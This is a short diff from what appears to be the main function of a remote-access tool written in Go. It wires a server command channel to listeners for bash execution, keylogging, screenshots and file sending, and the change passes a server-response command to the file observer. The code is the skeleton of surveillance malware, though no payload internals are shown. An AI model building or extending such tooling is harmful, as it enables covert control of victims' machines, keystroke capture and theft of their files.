@@ -33,7 +33,7 @@ func main() {
 	subject.AddListener(internal.NewBashExecutorObserver(respondServerCmd))
 	subject.AddListener(internal.NewKeyloggerCmdObserver())
 	subject.AddListener(internal.NewScreenshotCmdObserver(screenrecorder, sendFileCmd, respondServerCmd))
-	subject.AddListener(internal.NewFileCmdObserver(sendFileCmd, watchtower))
+	subject.AddListener(internal.NewFileCmdObserver(sendFileCmd, watchtower, respondServerCmd))
 
 	// Start Communications
 	wsc.StartCommunications(subject)
